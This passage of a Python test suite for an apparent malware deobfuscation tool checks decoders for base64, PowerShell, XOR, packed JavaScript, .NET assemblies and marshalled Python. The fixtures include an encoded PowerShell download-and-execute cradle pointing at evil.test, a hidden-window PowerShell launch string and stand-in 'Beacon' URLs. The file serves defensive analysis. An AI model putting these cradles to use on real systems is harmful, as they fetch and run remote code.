            "import { decode } from './decode';\nconsole.log(decode('a'));\n"
            "<<<END FILE>>>\n"
        )
        profiler = WorkspaceProfiler()

        result = profiler.apply(
            bundle,
            "workspace",
            {
                "iteration_state": {
                    "sample_metadata": {
                        "content_kind": "archive_bundle",
                        "stored_file_path": str(archive_path),
                        "filename": "repo.zip",
                    }
                }
            },
        )

        assert result.success is True
        context = result.details["workspace_context"]
        assert context["indexed_from_archive"] is True
        assert context["indexed_file_count"] >= 3
        assert "src/decode.js" in context["analysis_frontier"]
        assert "src/decode.js" in context["bundle_expansion_paths"]

    def test_workspace_file_deobfuscator_can_expand_bundle_from_archive(self, tmp_path):
        archive_path = tmp_path / "repo.zip"
        with zipfile.ZipFile(archive_path, mode="w") as archive:
            archive.writestr("src/main.js", "import { decode } from './decode';\nconsole.log(decode('a'));\n")
            archive.writestr("src/decode.js", "export function decode(value){ return String.fromCharCode(72, 105); }\n")

        bundle = (
            "UNWEAVER_WORKSPACE_BUNDLE v1\n"
            "archive_name: repo.zip\n"
            "included_files: 1\n"
            "omitted_files: 1\n"
            "languages: javascript=1\n"
            "entry_points: src/main.js\n"
            "suspicious_files: none\n"
            "manifest_files: none\n"
            "root_dirs: src\n"
            "bundle_note: preserve markers.\n\n"
            '<<<FILE path="src/main.js" language="javascript" priority="entrypoint" size=64>>>\n'
            "import { decode } from './decode';\nconsole.log(decode('a'));\n"
            "<<<END FILE>>>\n"
        )
        transform = WorkspaceFileDeobfuscator()

        result = transform.apply(
            bundle,
            "workspace",
            {
                "workspace_context": {
                    "entry_points": ["src/main.js"],
                    "analysis_frontier": ["src/decode.js", "src/main.js"],
                    "bundle_expansion_paths": ["src/decode.js"],
                    "llm_focus_paths": ["src/decode.js"],
                },
                "iteration_state": {
                    "sample_metadata": {
                        "content_kind": "archive_bundle",
                        "stored_file_path": str(archive_path),
                        "filename": "repo.zip",
                    }
                },
            },
        )

        assert result.success is True
        assert "src/decode.js" in result.details["added_files_to_bundle"]
        assert '<<<FILE path="src/decode.js"' in result.output

    def test_workspace_file_deobfuscator_uses_current_bundle_literals_over_archive(self, tmp_path):
        archive_path = tmp_path / "repo.zip"
        with zipfile.ZipFile(archive_path, mode="w") as archive:
            archive.writestr("src/a.js", 'export const VALUE = atob("aGk=");\n')
            archive.writestr("src/b.js", "import { VALUE } from './a.js';\nconsole.log(VALUE);\n")

        bundle = (
            "UNWEAVER_WORKSPACE_BUNDLE v1\n"
            "archive_name: repo.zip\n"
            "included_files: 2\n"
            "omitted_files: 0\n"
            "languages: javascript=2\n"
            "entry_points: src/b.js\n"
            "suspicious_files: src/a.js\n"
            "manifest_files: none\n"
            "root_dirs: src\n"
            "bundle_note: preserve markers.\n\n"
            '<<<FILE path="src/a.js" language="javascript" priority="suspicious" size=26>>>\n'
            'export const VALUE = "hi";\n'
            "<<<END FILE>>>\n\n"
            '<<<FILE path="src/b.js" language="javascript" priority="entrypoint" size=51>>>\n'
            "import { VALUE } from './a.js';\nconsole.log(VALUE);\n"
            "<<<END FILE>>>\n"
        )
        transform = WorkspaceFileDeobfuscator()

        result = transform.apply(
            bundle,
            "workspace",
            {
                "workspace_context": {
                    "entry_points": ["src/b.js"],
                    "analysis_frontier": ["src/b.js"],
                },
                "iteration_state": {
                    "sample_metadata": {
                        "content_kind": "archive_bundle",
                        "stored_file_path": str(archive_path),
                        "filename": "repo.zip",
                    }
                },
            },
        )

        assert result.success is False
        summary = result.details["file_transform_summary"]
        b_file = next(item for item in summary if item["path"] == "src/b.js")
        assert "VALUE" in b_file.get("imported_literals", [])


class TestAdditionalDecoderCoverage:
    def test_base64_decoder_keeps_js_parseable(self):
        decoder = Base64Decoder()
        result = decoder.apply(
            'var payload = atob("cHJpbnQoImhlbGxvIik=");',
            "javascript",
            {},
        )
        assert result.success is True
        assert result.output == 'var payload = "print(\\"hello\\")";'

    def test_hex_decoder_keeps_js_parseable(self):
        decoder = HexDecoder()
        result = decoder.apply(r'var payload = "\x68\x69";', "javascript", {})
        assert result.success is True
        assert result.output == 'var payload = "hi";'

    def test_powershell_getstring_wrapper_is_decoded(self):
        decoder = PowerShellDecoder()
        blob = (
            "SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMA"
            "bABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgA"
            "dAB0AHAAOgAvAC8AZQB2AGkAbAAuAHQAZQBzAHQALwBhACcAKQA="
        )
        code = (
            "iex ([System.Text.Encoding]::Unicode.GetString("
            f"[System.Convert]::FromBase64String('{blob}')))"
        )
        result = decoder.apply(code, "powershell", {})
        assert result.success is True
        assert "http://evil.test/a" in result.output
        assert any(
            item["decoded"].startswith("IEX (New-Object")
            for item in result.details["decoded_strings"]
        )

    def test_powershell_compressed_getstring_wrapper_is_decoded(self):
        decoder = PowerShellDecoder()
        code = (
            "iex ([System.Text.Encoding]::UTF8.GetString("
            " (New-Object IO.Compression.GzipStream("
            "  (New-Object IO.MemoryStream(,[Convert]::FromBase64String("
            "   'H4sIAAAAAAAAE8tIzcnJVyjPL8pJAQCFEUoNCwAAAA=='"
            "  ))),"
            "  [IO.Compression.CompressionMode]::Decompress"
            " )))"
            "))"
        )

        result = decoder.apply(code, "powershell", {})

        assert result.success is True
        assert "hello world" in result.output
        assert any(
            item["decoded"] == "hello world"
            for item in result.details["decoded_strings"]
        )

    def test_powershell_char_array_join_is_folded(self):
        decoder = PowerShellDecoder()
        result = decoder.apply("iex(([char[]](73,69,88)) -join '')", "powershell", {})

        assert result.success is True
        assert '"IEX"' in result.output
        assert any(
            change["type"] == "char_array_join"
            for change in result.details["changes"]
        )

    def test_powershell_decoder_resolves_variable_backed_getstring_and_iex(self):
        decoder = PowerShellDecoder()
        code = (
            "$a = [System.Convert]::FromBase64String('aHR0cDovL2V4YW1wbGUuY29tL3BheWxvYWQ=')\n"
            "$url = [System.Text.Encoding]::UTF8.GetString($a)\n"
            "$encoded = 'JABjACAAPQAgAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABTAHkAcwB0AGUAbQAuAE4AZQB0AC4AVwBlAGIAQwBsAGkAZQBuAHQA'\n"
            "$decoded = [System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String($encoded))\n"
            "IEX $decoded\n"
        )

        result = decoder.apply(code, "powershell", {})

        assert result.success is True
        assert "$url = 'http://example.com/payload'" in result.output
        assert "# DECODED (IEX):" in result.output
        assert "New-Object System.Net.WebClient" in result.output
        assert any(
            change["type"] == "binding_getstring"
            for change in result.details["changes"]
        )

    def test_string_decryptor_resolves_single_use_helper(self):
        decoder = StringDecryptor()
        code = (
            "function decodeString(s){return s.split('').reverse().join('');}\n"
            'alert(decodeString("cba"));'
        )
        result = decoder.apply(code, "javascript", {})
        assert result.success is True
        assert '"abc"' in result.output
        assert result.details["decrypted_strings"][0]["decrypted"] == "abc"

    def test_xor_recovery_prefers_explicit_key_for_decimal_arrays(self):
        decoder = XorRecovery()
        code = "const data = [29,16,25,25,26]; data.map(b => b ^ 0x75)"
        result = decoder.apply(code, "javascript", {})
        assert result.success is True
        assert result.details["results"][0]["method"] == "explicit_key_context"
        assert result.details["results"][0]["decoded"] == "hello"
        assert '"hello"' in result.output

    def test_js_packer_unpacker_unwraps_dean_edwards_payload(self):
        decoder = JavaScriptPackerUnpacker()
        code = (
            "eval(function(p,a,c,k,e,d){"
            "e=function(c){return c.toString(a)};"
            "if(!''.replace(/^/,String)){"
            "while(c--)d[c.toString(a)]=k[c]||c.toString(a);"
            "k=[function(e){return d[e]}];"
            "e=function(){return'\\\\w+'};"
            "c=1;};"
            "while(c--)if(k[c])p=p.replace(new RegExp('\\\\b'+e(c)+'\\\\b','g'),k[c]);"
            "return p;"
            "}('0(\\'1\\');',2,2,'alert|test'.split('|'),0,{}))"
        )

        result = decoder.apply(code, "javascript", {})

        assert result.success is True
        assert "alert('test');" in result.output
        assert "dean_edwards_packer" in result.details["detected_techniques"]

    def test_javascript_encoder_decoder_unwraps_constructor_chain(self):
        decoder = JavaScriptEncoderDecoder()
        code = '[]["filter"]["constructor"]("alert(\\"ok\\")")()'

        result = decoder.apply(code, "javascript", {})

        assert result.success is True
        assert 'alert("ok")' in result.output
        assert "javascript_runtime_encoder" in result.details["detected_techniques"]

    def test_dotnet_assembly_analyzer_extracts_metadata_and_strings(self):
        if shutil.which("dotnet") is None:
            pytest.skip("dotnet unavailable")
        decoder = DotNetAssemblyAnalyzer()
        assembly = build_test_dotnet_assembly(
            """
            using System;

            namespace Sample;

            public delegate string ProxyDelegate();

            public class Loader
            {
                public static string Beacon()
                {
                    return "http://evil.test/a";
                }

                public static string CallProxy()
                {
                    ProxyDelegate proxy = Beacon;
                    return proxy();
                }
            }
            """,
            "AssemblyAnalyzerSample",
        )

        result = decoder.apply(assembly.decode("latin-1"), "dotnet", {})

        assert result.success is True
        assert "Assembly: AssemblyAnalyzerSample" in result.output
        assert "public string Beacon()" in result.output
        assert 'return "http://evil.test/a";' in result.output
        assert "Sample.Loader.Beacon" in result.output
        decoded = [item["decoded"] for item in result.details["decoded_strings"]]
        assert "http://evil.test/a" in decoded
        assert "Sample.Loader.Beacon" in result.details["functions"]
        assert "System.Runtime" in result.details["imports"]
        assert "dotnet_assembly" in result.details["detected_techniques"]

    def test_dotnet_assembly_analyzer_extracts_embedded_resource_text(self):
        if shutil.which("dotnet") is None:
            pytest.skip("dotnet unavailable")
        decoder = DotNetAssemblyAnalyzer()
        assembly = build_test_dotnet_assembly_with_resources(
            """
            using System.IO;
            using System.Reflection;

            namespace Sample;

            public class Loader
            {
                public static string ReadPayload()
                {
                    using Stream stream = Assembly.GetExecutingAssembly()
                        .GetManifestResourceStream("ResourceBackedAssembly.payload.txt")!;
                    using var reader = new StreamReader(stream);
                    return reader.ReadToEnd();
                }
            }
            """,
            "ResourceBackedAssembly",
            {"payload.txt": "powershell -nop -w hidden"},
        )

        result = decoder.apply(assembly.decode("latin-1"), "dotnet", {})

        assert result.success is True
        assert "ResourceBackedAssembly.payload.txt" in result.output
        assert 'return "powershell -nop -w hidden";' in result.output
        decoded = [item["decoded"] for item in result.details["decoded_strings"]]
        assert "powershell -nop -w hidden" in decoded
        assert "embedded_resource" in result.details["detected_techniques"]

    def test_dotnet_assembly_analyzer_inlines_single_hop_proxy_calls(self):
        if shutil.which("dotnet") is None:
            pytest.skip("dotnet unavailable")
        decoder = DotNetAssemblyAnalyzer()
        assembly = build_test_dotnet_assembly(
            """
            namespace Sample;

            public class Loader
            {
                public static string Beacon()
                {
                    return "http://evil.test/a";
                }

                public static string Wrapper()
                {
                    return Beacon();
                }
            }
            """,
            "ProxyInlineAssembly",
        )

        result = decoder.apply(assembly.decode("latin-1"), "dotnet", {})

        assert result.success is True
        assert "public string Wrapper()" in result.output
        assert 'return "http://evil.test/a";' in result.output

    def test_dotnet_assembly_analyzer_inlines_multi_hop_proxy_chain(self):
        if shutil.which("dotnet") is None:
            pytest.skip("dotnet unavailable")
        decoder = DotNetAssemblyAnalyzer()
        assembly = build_test_dotnet_assembly(
            """
            namespace Sample;

            public class Loader
            {
                public static string Beacon()
                {
                    return "http://evil.test/a";
                }

                public static string Layer2()
                {
                    return Beacon();
                }

                public static string Layer1()
                {
                    return Layer2();
                }
            }
            """,
            "ProxyChainAssembly",
        )

        result = decoder.apply(assembly.decode("latin-1"), "dotnet", {})

        assert result.success is True
        assert "public string Layer1()" in result.output
        assert 'return "http://evil.test/a";' in result.output

    def test_dotnet_assembly_analyzer_extracts_resx_resource_manager_strings(self):
        if shutil.which("dotnet") is None:
            pytest.skip("dotnet unavailable")
        decoder = DotNetAssemblyAnalyzer()
        assembly = build_test_dotnet_assembly_with_resources(
            """
            using System.Globalization;
            using System.Reflection;
            using System.Resources;

            namespace Sample;

            public class Loader
            {
                private static readonly ResourceManager ResourceManager =
                    new("ResourceManagerAssembly.Strings", typeof(Loader).Assembly);

                public static string ReadPayload()
                {
                    return ResourceManager.GetString("Payload", CultureInfo.InvariantCulture)!;
                }
            }
            """,
            "ResourceManagerAssembly",
            {"Strings.resx": build_resx({"Payload": "https://evil.test/resx"})},
        )

        result = decoder.apply(assembly.decode("latin-1"), "dotnet", {})

        assert result.success is True
        assert "ResourceManagerAssembly.Strings.resources" in result.output
        assert "[Payload] https://evil.test/resx" in result.output
        assert 'return "https://evil.test/resx";' in result.output
        decoded = [item["decoded"] for item in result.details["decoded_strings"]]
        assert "https://evil.test/resx" in decoded

    def test_dotnet_assembly_analyzer_propagates_static_field_base64_decode(self):
        if shutil.which("dotnet") is None:
            pytest.skip("dotnet unavailable")
        decoder = DotNetAssemblyAnalyzer()
        assembly = build_test_dotnet_assembly(
            """
            using System;
            using System.Text;

            namespace Sample;

            public class Loader
            {
                private static readonly string Blob = "aGVsbG8gd29ybGQ=";

                public static string Decode()
                {
                    return Encoding.UTF8.GetString(Convert.FromBase64String(Blob));
                }
            }
            """,
            "FieldBackedDecodeAssembly",
        )

        result = decoder.apply(assembly.decode("latin-1"), "dotnet", {})

        assert result.success is True
        assert "public string Decode()" in result.output
        assert 'return "hello world";' in result.output
        decoded = [item["decoded"] for item in result.details["decoded_strings"]]
        assert "hello world" in decoded

    def test_dotnet_assembly_analyzer_decodes_gzip_base64_string_helpers(self):
        if shutil.which("dotnet") is None:
            pytest.skip("dotnet unavailable")
        decoder = DotNetAssemblyAnalyzer()
        assembly = build_test_dotnet_assembly(
            """
            using System;
            using System.IO;
            using System.IO.Compression;
            using System.Text;

            namespace Sample;

            public class Loader
            {
                public static string Inflate()
                {
                    using var source = new MemoryStream(Convert.FromBase64String("H4sIAAAAAAAAE8tIzcnJVyjPL8pJAQCFEUoNCwAAAA=="));
                    using var gzip = new GZipStream(source, CompressionMode.Decompress);
                    using var reader = new StreamReader(gzip, Encoding.UTF8);
                    return reader.ReadToEnd();
                }
            }
            """,
            "CompressedDecodeAssembly",
        )

        result = decoder.apply(assembly.decode("latin-1"), "dotnet", {})

        assert result.success is True
        assert "public string Inflate()" in result.output
        assert 'return "hello world";' in result.output
        decoded = [item["decoded"] for item in result.details["decoded_strings"]]
        assert "hello world" in decoded

    def test_dotnet_assembly_analyzer_folds_stringbuilder_strings(self):
        if shutil.which("dotnet") is None:
            pytest.skip("dotnet unavailable")
        decoder = DotNetAssemblyAnalyzer()
        assembly = build_test_dotnet_assembly(
            """
            using System.Text;

            namespace Sample;

            public class Loader
            {
                public static string BuildUrl()
                {
                    var builder = new StringBuilder();
                    builder.Append("https://");
                    builder.Append("evil.test/");
                    builder.Append("builder");
                    return builder.ToString();
                }
            }
            """,
            "StringBuilderAssembly",
        )

        result = decoder.apply(assembly.decode("latin-1"), "dotnet", {})

        assert result.success is True
        assert "public string BuildUrl()" in result.output
        assert 'return "https://evil.test/builder";' in result.output
        decoded = [item["decoded"] for item in result.details["decoded_strings"]]
        assert "https://evil.test/builder" in decoded

    def test_python_serialization_decoder_keeps_python_parseable(self):
        decoder = PythonSerializationDecoder()
        import marshal

        payload = marshal.dumps(
            compile(
                'import os\nurl="http://evil.test"\ndef beacon():\n    return os.name\nprint(beacon())',
                "<x>",
                "exec",
            )
        )
        blob = base64.b64encode(payload).decode()
        code = (
            "import base64, marshal\n"
            f'exec(marshal.loads(base64.b64decode("{blob}")))'
        )
        result = decoder.apply(code, "python", {})
        assert result.success is True
        ast.parse(result.output)
        decoded = [item["decoded"] for item in result.details["decoded_strings"]]
        assert "http://evil.test" in decoded
        assert result.details["imports"] == ["os"]
        assert "beacon" in result.details["functions"]
        assert result.details["marshal_analysis"][0]["ok"] is True
        assert any(
            "IMPORT_NAME 'os'" in line
            for line in result.details["disassembly_preview"]
        )

    def test_python_decoder_unwraps_exec_compile_literal_bindings(self):
        decoder = PythonDecoder()
        code = (
            'src = "print(\\"hi\\")"\n'
            "exec(compile(src, '<x>', 'exec'))"
        )

        result = decoder.apply(code, "python", {})

        assert result.success is True
        ast.parse(result.output)
        assert 'print("hi")' in result.output
        assert any(
            change["type"] == "exec_compile"
            for change in result.details["changes"]
        )

    def test_python_decoder_unwraps_exec_compile_with_inline_base64(self):
        decoder = PythonDecoder()
        blob = base64.b64encode(b"print('hello')").decode()
        code = (
            "import base64\n"
            f"exec(compile(base64.b64decode('{blob}').decode(), '<x>', 'exec'))"
        )

        result = decoder.apply(code, "python", {})

        assert result.success is True
        ast.parse(result.output)
        assert "print('hello')" in result.output

    def test_python_decoder_unwraps_exec_with_variable_backed_base64(self):
        decoder = PythonDecoder()
        code = (
            "import base64\n"
            "_x = 'aW1wb3J0IG9zOyBvcy5zeXN0ZW0oJ2VjaG8gZGVtbycp'\n"
            "exec(base64.b64decode(_x))\n"
        )

        result = decoder.apply(code, "python", {})

        assert result.success is True
        ast.parse(result.output)
        assert "import os; os.system('echo demo')" in result.output
        assert any(
            change["type"] == "exec_resolved"
            for change in result.details["changes"]
        )
